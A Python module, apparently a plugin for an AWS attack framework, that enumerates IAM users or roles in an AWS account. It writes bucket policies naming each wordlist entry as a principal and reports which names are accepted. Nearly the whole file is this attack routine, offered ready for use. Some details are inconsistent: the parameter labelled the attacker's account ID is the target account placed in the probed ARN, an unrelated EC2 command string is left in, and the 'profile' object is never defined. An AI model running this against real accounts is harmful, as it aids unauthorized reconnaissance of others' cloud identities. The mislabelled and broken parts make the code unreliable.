import sys

import boto3
import botocore
from termcolor import colored
from datetime import datetime
import json
from pydoc import pipepager

author = {
    "name":"",
    "twitter":"",
    "github":"",
    "email":""
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "s3",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"ATTACKER-S3-BUCKET": {
		"value": "",
		"required": "true",
        "description":"The Bucket Name of a bucket owned by the Attacker"
	},
	"ATTACKER-ACCOUNT-ID": {
		"value": "",
		"required": "true",
        "description":"The Account ID of an account owned by the Attacker"
	},
	"WORDLIST": {
		"value": "",
		"required": "true",
        "description":"The path to the wordlist of users to fuzz"
	},
	"ROLE-OR-USER": {
		"value": "",
		"required": "true",
        "description":"Choose ROLE of you want to fuzz roles or USER if you want to fuzz users"
	},

}
description = "Enumerate IAM/Users of an AWS account. You must provide your OWN AWS account and bucket. Also, add credentials of a user on the account you own that has PutBucketPolicy Permission allowed."

aws_command = "aws ec2 describe-launch-templates --region {} --profile {}"

colors = [
    "not-used",
    "red",
    "blue",
    "yellow",
    "green",
    "magenta",
    "cyan",
    "white"
]

output = ""

def list_dictionary(d, n_tab):
	global output
	if isinstance(d, list):
		n_tab += 1
		for i in d:
			if not isinstance(i, list) and not isinstance(i, dict):
				output += ("{}{}\n".format("\t" * n_tab, colored(i, colors[n_tab])))
			else:
				list_dictionary(i, n_tab)
	elif isinstance(d, dict):
		n_tab+=1
		for key, value in d.items():
			if not isinstance(value, dict) and not isinstance(value, list):
				output += ("{}{}: {}\n".format("\t"*n_tab, colored(key, colors[n_tab], attrs=['bold']) , colored(value, colors[n_tab+1])))
			else:
				output += ("{}{}:\n".format("\t"*n_tab, colored(key, colors[n_tab], attrs=['bold'])))
				list_dictionary(value, n_tab)

def exploit():
	account_id = variables['ATTACKER-ACCOUNT-ID']['value']
	bucket_name = variables['ATTACKER-S3-BUCKET']['value']
	wordlist = variables['WORDLIST']['value']
	roleoruser = (variables['ROLE-OR-USER']['value']).strip()
	a = [roleoruser]

	print(json.dumps(a))

	if roleoruser == "ROLE" or roleoruser == "USER" or roleoruser == "role" or roleoruser == "user":
		if roleoruser == "ROLE" or roleoruser == "role":
			principal = "role"
		elif roleoruser == "user" or roleoruser == "USER":
			principal = "user"
		try:
			r = open(wordlist, 'r')
			for name in r:
				policy_json = '{"Version":"2012-10-17","Statement":[{"Sid":"Example permissions","Effect":"Deny","Principal":{"AWS":"arn:aws:iam::' + account_id + ':' + principal + '/' + name[:-1] + '"},"Action":["s3:ListBucket"],"Resource":"arn:aws:s3:::' + bucket_name + '"}]}'
				try:
					profile.put_bucket_policy(
						Bucket=bucket_name,
						Policy=policy_json,

					)
					print("%s Found!: %s" % (principal, name[:-1]))
				except botocore.exceptions.ClientError as error:
					print(sys.exc_info())
		except OSError:
			print(colored("Could not open/read file: {}".format(r), "red"))
	else:
		print(colored(
			"[*] ROLE-OR-USER value should be either ROLE or USER!", "red"
		))
